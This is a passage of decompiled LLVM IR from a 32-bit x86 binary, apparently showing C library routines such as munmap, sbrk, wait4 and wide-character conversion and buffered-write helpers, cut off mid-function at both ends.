  uselistorder i32 %v1_80544f5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_805450c, { 1, 0 }
}

define i32 @function_8054514(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054514:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054514 = load i32, i32* @ebx, align 4
  store i32 %v0_8054514, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8054527 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8054527, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8054527, -4095
  br i1 %tmp, label %dec_label_pc_8054540, label %dec_label_pc_8054534

dec_label_pc_8054534:                             ; preds = %dec_label_pc_8054514
  %v0_8054534 = load i32, i32* %stack_var_-4, align 4
  %v1_8054534 = call i32 @function_8050f90(i32 %v0_8054534)
  %v0_8054539 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054539 = sub i32 0, %v0_8054539
  %v2_805453b = inttoptr i32 %v1_8054534 to i32*
  store i32 %v1_8054539, i32* %v2_805453b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054540

dec_label_pc_8054540:                             ; preds = %dec_label_pc_8054514, %dec_label_pc_8054534
  %v0_8054541 = phi i32 [ %v3_8054527, %dec_label_pc_8054514 ], [ -1, %dec_label_pc_8054534 ]
  %v2_8054540 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054540, i32* @edx, align 4
  %v2_8054544 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054544, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054541

; uselistorder directives
  uselistorder i32 %v3_8054527, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054540, { 1, 0 }
}

define i32 @function_805457c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805457c:
  %stack_var_-12 = alloca i32, align 4
  %v0_805457d = load i32, i32* @ebx, align 4
  %v0_8054581 = load i32, i32* @global_var_8064b44.389, align 4
  %v1_8054581 = icmp eq i32 %v0_8054581, 0
  %v1_805458c = icmp eq i1 %v1_8054581, false
  br i1 %v1_805458c, label %dec_label_pc_805459f, label %dec_label_pc_805458e

dec_label_pc_805458e:                             ; preds = %dec_label_pc_805457c
  %v1_8054593 = call i32 @function_8055cf8(i32 0)
  %v2_805459b = icmp slt i32 %v1_8054593, 0
  br i1 %v2_805459b, label %dec_label_pc_80545c1, label %dec_label_pc_805458e.dec_label_pc_805459f_crit_edge

dec_label_pc_805458e.dec_label_pc_805459f_crit_edge: ; preds = %dec_label_pc_805458e
  %v0_80545a1.pre = load i32, i32* @global_var_8064b44.389, align 4
  br label %dec_label_pc_805459f

dec_label_pc_805459f:                             ; preds = %dec_label_pc_805458e.dec_label_pc_805459f_crit_edge, %dec_label_pc_805457c
  %v0_80545af = phi i32 [ %v0_80545a1.pre, %dec_label_pc_805458e.dec_label_pc_805459f_crit_edge ], [ %v0_8054581, %dec_label_pc_805457c ]
  %v1_805459f = icmp eq i32 %arg1, 0
  %v1_80545a6 = icmp eq i1 %v1_805459f, false
  br i1 %v1_80545a6, label %dec_label_pc_80545ac, label %dec_label_pc_80545a8

dec_label_pc_80545a8:                             ; preds = %dec_label_pc_805459f
  br label %dec_label_pc_80545c4

dec_label_pc_80545ac:                             ; preds = %dec_label_pc_805459f
  store i32 %v0_80545af, i32* @ebx, align 4
  %v2_80545b1 = add i32 %v0_80545af, %arg1
  %v1_80545b5 = call i32 @function_8055cf8(i32 %v2_80545b1)
  %v2_80545bd = icmp slt i32 %v1_80545b5, 0
  %v1_80545bf = icmp eq i1 %v2_80545bd, false
  br i1 %v1_80545bf, label %dec_label_pc_80545ac.dec_label_pc_80545c4_crit_edge, label %dec_label_pc_80545c1

dec_label_pc_80545ac.dec_label_pc_80545c4_crit_edge: ; preds = %dec_label_pc_80545ac
  %v0_80545c5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80545c4

dec_label_pc_80545c1:                             ; preds = %dec_label_pc_80545ac, %dec_label_pc_805458e
  br label %dec_label_pc_80545c4

dec_label_pc_80545c4:                             ; preds = %dec_label_pc_80545ac.dec_label_pc_80545c4_crit_edge, %dec_label_pc_80545a8, %dec_label_pc_80545c1
  %v0_80545c5 = phi i32 [ %v0_80545c5.pre, %dec_label_pc_80545ac.dec_label_pc_80545c4_crit_edge ], [ %v0_80545af, %dec_label_pc_80545a8 ], [ -1, %dec_label_pc_80545c1 ]
  %v2_80545c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80545c4, i32* @edx, align 4
  store i32 %v0_805457d, i32* @ebx, align 4
  ret i32 %v0_80545c5

; uselistorder directives
  uselistorder i32 %v0_80545af, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8055cf8, { 1, 0 }
  uselistorder label %dec_label_pc_80545c4, { 2, 0, 1 }
}

define i32 @function_80545cc(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_80545cc:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80545cd = load i32, i32* @esi, align 4
  store i32 %v0_80545cd, i32* %stack_var_-8, align 4
  %v4_80545dd = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_80545dd, i32* %esi.global-to-local, align 4
  %v0_80545e1 = load i32, i32* @ebx, align 4
  %v6_80545e9 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_80545e1, i32* @ebx, align 4
  store i32 %v6_80545e9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80545e9, -4095
  br i1 %tmp, label %dec_label_pc_8054601, label %dec_label_pc_80545f5

dec_label_pc_80545f5:                             ; preds = %dec_label_pc_80545cc
  %v1_80545f5 = call i32 @function_8050f90(i32 %v0_80545e1)
  %v0_80545fa = load i32, i32* %esi.global-to-local, align 4
  %v1_80545fa = sub i32 0, %v0_80545fa
  %v2_80545fc = inttoptr i32 %v1_80545f5 to i32*
  store i32 %v1_80545fa, i32* %v2_80545fc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054601

dec_label_pc_8054601:                             ; preds = %dec_label_pc_80545cc, %dec_label_pc_80545f5
  %v0_8054602 = phi i32 [ %v6_80545e9, %dec_label_pc_80545cc ], [ -1, %dec_label_pc_80545f5 ]
  %v2_8054604 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054604, i32* @esi, align 4
  ret i32 %v0_8054602

; uselistorder directives
  uselistorder i32 %v6_80545e9, { 1, 0, 2 }
  uselistorder i32 %v0_80545e1, { 1, 0 }
  uselistorder label %dec_label_pc_8054601, { 1, 0 }
}

define i32 @function_8054608() local_unnamed_addr {
dec_label_pc_8054608:
  ret i32 ptrtoint (i32* @global_var_8064b24.390 to i32)
}

define i32 @function_8054610() local_unnamed_addr {
dec_label_pc_8054610:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_805461b = icmp eq i32 %tmp4, 0
  %v1_805461d = icmp eq i1 %v1_805461b, false
  br i1 %v1_805461d, label %dec_label_pc_8054625, label %dec_label_pc_805461f

dec_label_pc_805461f:                             ; preds = %dec_label_pc_8054610
  %v2_805461f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8054625

dec_label_pc_8054625:                             ; preds = %dec_label_pc_8054610, %dec_label_pc_805461f
  %v0_8054641 = phi i32 [ %tmp4, %dec_label_pc_8054610 ], [ %v2_805461f, %dec_label_pc_805461f ]
  %v0_805462d = phi i32 [ %tmp3, %dec_label_pc_8054610 ], [ 0, %dec_label_pc_805461f ]
  %v2_8054625 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8054625, i32* %stack_var_-8, align 4
  store i32 %v0_805462d, i32* %stack_var_-4, align 4
  %v2_805463c = ptrtoint i32* %stack_var_-8 to i32
  %v5_8054642 = inttoptr i32 %v0_8054641 to i8*
  %v6_8054642 = call i32 @function_8054678(i8* %v5_8054642, i32 %v2_805463c, i32 1, i32 16, i32 %tmp)
  %v1_805464c = icmp eq i32 %v6_8054642, 0
  %v3_805464e = select i1 %v1_805464c, i32 1, i32 %v6_8054642
  ret i32 %v3_805464e

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8054625, { 1, 0 }
}

define i32 @function_8054658() local_unnamed_addr {
dec_label_pc_8054658:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_805466d = inttoptr i32 %tmp to i8*
  %v6_805466d = call i32 @function_8054678(i8* %v5_805466d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_805466d
}

define i32 @function_8054678(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8054678:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_805467b = load i32, i32* @ebx, align 4
  %v4_805467f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805467f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_805468f = icmp eq i8* %arg1, null
  store i1 %v1_805468f, i1* %zf.global-to-local, align 1
  br i1 %v1_805468f, label %dec_label_pc_805469e, label %dec_label_pc_8054693

dec_label_pc_8054693:                             ; preds = %dec_label_pc_8054678
  %v12_8054693 = icmp eq i32 %v4_805467f, %arg2
  store i1 %v12_8054693, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805469a = icmp eq i1 %v12_8054693, false
  br i1 %v1_805469a, label %dec_label_pc_80546c1, label %dec_label_pc_80546bb

dec_label_pc_805469e:                             ; preds = %dec_label_pc_8054678
  %v2_805469e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805469e, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80546bf

dec_label_pc_80546a7:                             ; preds = %dec_label_pc_80546cf
  %v1_80546a7 = call i32 @function_8050f90(i32 %v0_805467b)
  %v1_80546ac = inttoptr i32 %v1_80546a7 to i32*
  store i32 84, i32* %v1_80546ac, align 4
  br label %dec_label_pc_80546f5

dec_label_pc_80546b7:                             ; preds = %dec_label_pc_80546d6
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80546ea.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80546e6

dec_label_pc_80546bb:                             ; preds = %dec_label_pc_8054693
  %v2_80546bb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80546bb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80546bf

dec_label_pc_80546bf:                             ; preds = %dec_label_pc_805469e, %dec_label_pc_80546bb
  %v2_80546d816 = phi i32 [ %v2_805469e, %dec_label_pc_805469e ], [ %v2_80546bb, %dec_label_pc_80546bb ]
  %v1_80546c412 = phi i32 [ -1, %dec_label_pc_805469e ], [ %arg4, %dec_label_pc_80546bb ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80546c1

dec_label_pc_80546c1:                             ; preds = %dec_label_pc_8054693, %dec_label_pc_80546bf
  %v2_80546d815 = phi i32 [ %v4_805467f, %dec_label_pc_8054693 ], [ %v2_80546d816, %dec_label_pc_80546bf ]
  %v0_80546c6 = phi i32 [ %arg4, %dec_label_pc_8054693 ], [ %v1_80546c412, %dec_label_pc_80546bf ]
  %v1_80546c1 = inttoptr i32 %arg2 to i32*
  %v2_80546c1 = load i32, i32* %v1_80546c1, align 4
  store i32 %v2_80546c1, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80546c6, %arg3
  %v5_80546c8 = select i1 %tmp31, i32 %arg3, i32 %v0_80546c6
  store i32 %v5_80546c8, i32* %edi.global-to-local, align 4
  store i32 %v5_80546c8, i32* @ecx, align 4
  %v1_80546e23 = icmp eq i32 %v5_80546c8, 0
  store i1 %v1_80546e23, i1* %zf.global-to-local, align 1
  %v1_80546e410 = icmp eq i1 %v1_80546e23, false
  br i1 %v1_80546e410, label %dec_label_pc_80546cf, label %dec_label_pc_80546e6

dec_label_pc_80546cf:                             ; preds = %dec_label_pc_80546c1, %dec_label_pc_80546dc
  %v2_80546d8 = phi i32 [ %v2_80546df, %dec_label_pc_80546dc ], [ %v2_80546d815, %dec_label_pc_80546c1 ]
  %v0_80546cf = phi i32 [ %v1_80546dc, %dec_label_pc_80546dc ], [ %v2_80546c1, %dec_label_pc_80546c1 ]
  %v1_80546cf = inttoptr i32 %v0_80546cf to i32*
  %v2_80546cf = load i32, i32* %v1_80546cf, align 4
  %v9_80546d1 = icmp eq i32 %v2_80546cf, 127
  store i1 %v9_80546d1, i1* %zf.global-to-local, align 1
  %v6_80546d4 = icmp ugt i32 %v2_80546cf, 127
  br i1 %v6_80546d4, label %dec_label_pc_80546a7, label %dec_label_pc_80546d6

dec_label_pc_80546d6:                             ; preds = %dec_label_pc_80546cf
  %v3_80546d6 = trunc i32 %v2_80546cf to i8
  %v4_80546d6 = icmp eq i8 %v3_80546d6, 0
  store i1 %v4_80546d6, i1* %zf.global-to-local, align 1
  %v3_80546d8 = inttoptr i32 %v2_80546d8 to i8*
  store i8 %v3_80546d6, i8* %v3_80546d8, align 1
  %v0_80546da = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80546da, label %dec_label_pc_80546b7, label %dec_label_pc_80546dc

dec_label_pc_80546dc:                             ; preds = %dec_label_pc_80546d6
  %v0_80546dc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546dc = add i32 %v0_80546dc, 4
  store i32 %v1_80546dc, i32* %ebx.global-to-local, align 4
  %v0_80546df = load i32, i32* %edx.global-to-local, align 4
  %v1_80546df = load i32, i32* %esi.global-to-local, align 4
  %v2_80546df = add i32 %v1_80546df, %v0_80546df
  store i32 %v2_80546df, i32* %edx.global-to-local, align 4
  %v0_80546e1 = load i32, i32* @ecx, align 4
  %v1_80546e1 = add i32 %v0_80546e1, -1
  %v8_80546e1 = icmp eq i32 %v1_80546e1, 0
  store i32 %v1_80546e1, i32* @ecx, align 4
  store i1 %v8_80546e1, i1* %zf.global-to-local, align 1
  %v1_80546e4 = icmp eq i1 %v8_80546e1, false
  br i1 %v1_80546e4, label %dec_label_pc_80546cf, label %dec_label_pc_80546e6

dec_label_pc_80546e6:                             ; preds = %dec_label_pc_80546dc, %dec_label_pc_80546c1, %dec_label_pc_80546b7
  %v0_80546ee = phi i32 [ 0, %dec_label_pc_80546b7 ], [ %v2_80546c1, %dec_label_pc_80546c1 ], [ %v1_80546dc, %dec_label_pc_80546dc ]
  %v0_80546ea = phi i32 [ %v0_80546ea.pre, %dec_label_pc_80546b7 ], [ %v2_80546d815, %dec_label_pc_80546c1 ], [ %v2_80546df, %dec_label_pc_80546dc ]
  %v2_80546e6 = ptrtoint i32* %stack_var_-32 to i32
  %v12_80546ea = icmp eq i32 %v0_80546ea, %v2_80546e6
  store i1 %v12_80546ea, i1* %zf.global-to-local, align 1
  br i1 %v12_80546ea, label %dec_label_pc_80546f1, label %dec_label_pc_80546ee

dec_label_pc_80546ee:                             ; preds = %dec_label_pc_80546e6
  %v1_80546ee = load i32, i32* %ebp.global-to-local, align 4
  %v2_80546ee = inttoptr i32 %v1_80546ee to i32*
  store i32 %v0_80546ee, i32* %v2_80546ee, align 4
  br label %dec_label_pc_80546f1

dec_label_pc_80546f1:                             ; preds = %dec_label_pc_80546e6, %dec_label_pc_80546ee
  %v0_80546f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80546f3 = load i32, i32* @ecx, align 4
  %v2_80546f3 = sub i32 %v0_80546f1, %v1_80546f3
  %v12_80546f3 = icmp eq i32 %v2_80546f3, 0
  br label %dec_label_pc_80546f5

dec_label_pc_80546f5:                             ; preds = %dec_label_pc_80546a7, %dec_label_pc_80546f1
  %storemerge = phi i1 [ %v12_80546f3, %dec_label_pc_80546f1 ], [ false, %dec_label_pc_80546a7 ]
  %storemerge1 = phi i32 [ %v2_80546f3, %dec_label_pc_80546f1 ], [ -1, %dec_label_pc_80546a7 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80546f5 = load i32, i32* @esp, align 4
  %v9_80546f5 = icmp eq i32 %v0_80546f5, -28
  store i1 %v9_80546f5, i1* %zf.global-to-local, align 1
  store i32 %v0_805467b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80546ea, { 1, 0 }
  uselistorder i32 %v2_80546df, { 0, 2, 1 }
  uselistorder i32 %v1_80546dc, { 0, 2, 1 }
  uselistorder i32 %v2_80546cf, { 1, 2, 0 }
  uselistorder i32 %v2_80546c1, { 1, 0, 2 }
  uselistorder i32 %v0_80546c6, { 1, 0 }
  uselistorder i32 %v2_80546d815, { 1, 0 }
  uselistorder i1 %v12_8054693, { 1, 0 }
  uselistorder i32 %v4_805467f, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 2, 0, 3, 8, 5, 6, 7, 1, 9, 4, 10, 11, 12 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 3, 0, 2, 7, 4, 5, 8, 1, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546f5, { 1, 0 }
  uselistorder label %dec_label_pc_80546f1, { 1, 0 }
  uselistorder label %dec_label_pc_80546cf, { 1, 0 }
  uselistorder label %dec_label_pc_80546c1, { 1, 0 }
  uselistorder label %dec_label_pc_80546bf, { 1, 0 }
}

define i32 @function_8054700(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8054700:
  %stack_var_12 = alloca i32, align 4
  %v2_8054703 = ptrtoint i32* %stack_var_12 to i32
  %v0_805470b = load i32, i32* @edx, align 4
  %v4_8054715 = inttoptr i32 %arg1 to i16*
  %v5_8054715 = call i32 @function_8055048(i16* %v4_8054715, i32 %arg2, i32 %v2_8054703, i32 %v0_805470b)
  ret i32 %v5_8054715
}

define i32 @function_8054720(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054720:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_8054721 = load i32, i32* @edi, align 4
  %v0_8054723 = load i32, i32* @ebx, align 4
  %v15_8054724 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8054727 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054727, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80547334 = icmp eq i32 %arg3, 0
  store i1 %v1_80547334, i1* %zf.global-to-local, align 1
  br i1 %v1_80547334, label %dec_label_pc_8054794, label %dec_label_pc_8054738.lr.ph

dec_label_pc_8054738.lr.ph:                       ; preds = %dec_label_pc_8054720
  br label %dec_label_pc_8054738

dec_label_pc_8054738:                             ; preds = %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge, %dec_label_pc_8054738.lr.ph
  %v0_8054745 = phi i32 [ %v4_8054727, %dec_label_pc_8054738.lr.ph ], [ %v0_8054745.pre, %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge ]
  %v0_8054744 = phi i32 [ %arg2, %dec_label_pc_8054738.lr.ph ], [ %v2_8054756, %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge ]
  %v0_8054740.in = phi i32 [ %arg3, %dec_label_pc_8054738.lr.ph ], [ %v2_8054754, %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge ]
  %v4_8054740 = phi i32 [ %arg3, %dec_label_pc_8054738.lr.ph ], [ %v2_8054754, %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge ]
  %v0_8054740 = icmp slt i32 %v0_8054740.in, 0
  store i32 %v4_8054740, i32* %esi.global-to-local, align 4
  %v2_8054740 = icmp eq i1 %v0_8054740, false
  %v5_8054740 = select i1 %v2_8054740, i32 %v4_8054740, i32 2147483647
  store i32 %v5_8054740, i32* %eax.global-to-local, align 4
  %v1_8054745 = add i32 %v0_8054745, 4
  %v2_8054745 = inttoptr i32 %v1_8054745 to i32*
  %v3_8054745 = load i32, i32* %v2_8054745, align 4
  %tmp36 = inttoptr i32 %v0_8054744 to i32*
  %v5_8054748 = call i32 @function_8050f24(i32 %v3_8054745, i32* %tmp36, i32 %v5_8054740)
  store i32 %v5_8054748, i32* %eax.global-to-local, align 4
  %v1_8054750 = icmp eq i32 %v5_8054748, 0
  store i1 %v1_8054750, i1* %zf.global-to-local, align 1
  %v2_8054750 = icmp slt i32 %v5_8054748, 0
  br i1 %v2_8054750, label %dec_label_pc_805475a, label %dec_label_pc_8054754

dec_label_pc_8054754:                             ; preds = %dec_label_pc_8054738
  %v0_8054754 = load i32, i32* @ebx, align 4
  %v2_8054754 = sub i32 %v0_8054754, %v5_8054748
  %v12_8054754 = icmp eq i32 %v2_8054754, 0
  store i32 %v2_8054754, i32* @ebx, align 4
  %v0_8054756 = load i32, i32* @edi, align 4
  %v2_8054756 = add i32 %v0_8054756, %v5_8054748
  store i32 %v2_8054756, i32* @edi, align 4
  store i1 %v12_8054754, i1* %zf.global-to-local, align 1
  br i1 %v12_8054754, label %dec_label_pc_8054794, label %dec_label_pc_8054754.dec_label_pc_8054738_crit_edge

dec_label_pc_8054754.dec_label_pc_8054738_crit_edge: ; preds = %dec_label_pc_8054754
  %v0_8054745.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054738

dec_label_pc_805475a:                             ; preds = %dec_label_pc_8054738
  %v0_805475a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805475a = inttoptr i32 %v0_805475a to i32*
  %v2_805475a = load i32, i32* %v1_805475a, align 4
  store i32 %v2_805475a, i32* %eax.global-to-local, align 4
  %v1_805475d = add i32 %v0_805475a, 8
  %v2_805475d = inttoptr i32 %v1_805475d to i32*
  %v3_805475d = load i32, i32* %v2_805475d, align 4
  store i32 %v3_805475d, i32* @edx, align 4
  %v1_8054760 = or i32 %v2_805475a, 8
  store i32 %v1_8054760, i32* %eax.global-to-local, align 4
  %v1_8054763 = trunc i32 %v1_8054760 to i16
  %v3_8054763 = inttoptr i32 %v0_805475a to i16*
  store i16 %v1_8054763, i16* %v3_8054763, align 2
  %v0_8054767 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054767 = add i32 %v0_8054767, 12
  %v2_8054767 = inttoptr i32 %v1_8054767 to i32*
  %v3_8054767 = load i32, i32* %v2_8054767, align 4
  %v1_805476a = load i32, i32* @edx, align 4
  %v2_805476a = sub i32 %v3_8054767, %v1_805476a
  %v12_805476a = icmp eq i32 %v2_805476a, 0
  store i1 %v12_805476a, i1* %zf.global-to-local, align 1
  store i32 %v2_805476a, i32* %eax.global-to-local, align 4
  %v4_8054790.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805476a, label %dec_label_pc_8054790, label %dec_label_pc_805476e

dec_label_pc_805476e:                             ; preds = %dec_label_pc_805475a
  %v12_805476e = icmp eq i32 %v2_805476a, %v4_8054790.pre
  store i1 %v12_805476e, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_805476a, %v4_8054790.pre
  %v3_8054770 = load i32, i32* %esi.global-to-local, align 4
  %v5_8054770 = select i1 %tmp, i32 %v2_805476a, i32 %v3_8054770
  store i32 %v5_8054770, i32* %esi.global-to-local, align 4
  %v0_8054773.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054773

dec_label_pc_8054773:                             ; preds = %dec_label_pc_8054785, %dec_label_pc_805476e
  %v2_8054777 = phi i32 [ %v1_8054781, %dec_label_pc_8054785 ], [ %v1_805476a, %dec_label_pc_805476e ]
  %v4_8054773 = phi i32 [ %v4_8054773.pre, %dec_label_pc_8054785 ], [ %v2_805476a, %dec_label_pc_805476e ]
  %v0_8054773 = phi i32 [ %v1_8054785, %dec_label_pc_8054785 ], [ %v0_8054773.pre, %dec_label_pc_805476e ]
  %v1_8054773 = inttoptr i32 %v0_8054773 to i8*
  %v2_8054773 = load i8, i8* %v1_8054773, align 1
  %v3_8054773 = zext i8 %v2_8054773 to i32
  %v5_8054773 = and i32 %v4_8054773, -256
  %v6_8054773 = or i32 %v3_8054773, %v5_8054773
  store i32 %v6_8054773, i32* %eax.global-to-local, align 4
  %v10_8054775 = icmp eq i8 %v2_8054773, 10
  store i1 %v10_8054775, i1* %zf.global-to-local, align 1
  %v3_8054777 = inttoptr i32 %v2_8054777 to i8*
  store i8 %v2_8054773, i8* %v3_8054777, align 1
  %v0_8054779 = load i1, i1* %zf.global-to-local, align 1
  %v1_8054779 = icmp eq i1 %v0_8054779, false
  br i1 %v1_8054779, label %dec_label_pc_8054781, label %dec_label_pc_805477b

dec_label_pc_805477b:                             ; preds = %dec_label_pc_8054773
  %v0_805477b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805477b = add i32 %v0_805477b, 1
  %v2_805477b = inttoptr i32 %v1_805477b to i8*
  %v3_805477b = load i8, i8* %v2_805477b, align 1
  %v4_805477b = urem i8 %v3_805477b, 2
  %v5_805477b = icmp eq i8 %v4_805477b, 0
  store i1 %v5_805477b, i1* %zf.global-to-local, align 1
  %v1_805477f = icmp eq i1 %v5_805477b, false
  br i1 %v1_805477f, label %dec_label_pc_805477b.dec_label_pc_8054788_crit_edge, label %dec_label_pc_8054781

dec_label_pc_805477b.dec_label_pc_8054788_crit_edge: ; preds = %dec_label_pc_805477b
  %v0_8054788.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054788

dec_label_pc_8054781:                             ; preds = %dec_label_pc_805477b, %dec_label_pc_8054773
  %v0_8054781 = load i32, i32* @edx, align 4
  %v1_8054781 = add i32 %v0_8054781, 1
  store i32 %v1_8054781, i32* @edx, align 4
  %v0_8054782 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054782 = add i32 %v0_8054782, -1
  %v8_8054782 = icmp eq i32 %v1_8054782, 0
  store i1 %v8_8054782, i1* %zf.global-to-local, align 1
  store i32 %v1_8054782, i32* %esi.global-to-local, align 4
  br i1 %v8_8054782, label %dec_label_pc_8054781.dec_label_pc_8054788_crit_edge, label %dec_label_pc_8054785

dec_label_pc_8054781.dec_label_pc_8054788_crit_edge: ; preds = %dec_label_pc_8054781
  %v1_8054788.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054788

dec_label_pc_8054785:                             ; preds = %dec_label_pc_8054781
  %v0_8054785 = load i32, i32* @edi, align 4
  %v1_8054785 = add i32 %v0_8054785, 1
  %v8_8054785 = icmp eq i32 %v1_8054785, 0
  store i1 %v8_8054785, i1* %zf.global-to-local, align 1
  store i32 %v1_8054785, i32* @edi, align 4
  %v4_8054773.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054773

dec_label_pc_8054788:                             ; preds = %dec_label_pc_8054781.dec_label_pc_8054788_crit_edge, %dec_label_pc_805477b.dec_label_pc_8054788_crit_edge
  %v1_8054788 = phi i32 [ %v0_805477b, %dec_label_pc_805477b.dec_label_pc_8054788_crit_edge ], [ %v1_8054788.pre, %dec_label_pc_8054781.dec_label_pc_8054788_crit_edge ]
  %v0_8054788 = phi i32 [ %v0_8054788.pre, %dec_label_pc_805477b.dec_label_pc_8054788_crit_edge ], [ %v1_8054781, %dec_label_pc_8054781.dec_label_pc_8054788_crit_edge ]
  %v2_8054788 = add i32 %v1_8054788, 16
  %v3_8054788 = inttoptr i32 %v2_8054788 to i32*
  store i32 %v0_8054788, i32* %v3_8054788, align 4
  %v0_805478b = load i32, i32* @edx, align 4
  %v1_805478b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805478b = add i32 %v1_805478b, 8
  %v3_805478b = inttoptr i32 %v2_805478b to i32*
  %v4_805478b = load i32, i32* %v3_805478b, align 4
  %v5_805478b = sub i32 %v0_805478b, %v4_805478b
  store i32 %v5_805478b, i32* @edx, align 4
  %v0_805478e = load i32, i32* @ebx, align 4
  %v2_805478e = sub i32 %v0_805478e, %v5_805478b
  %v12_805478e = icmp eq i32 %v2_805478e, 0
  store i1 %v12_805478e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8054790

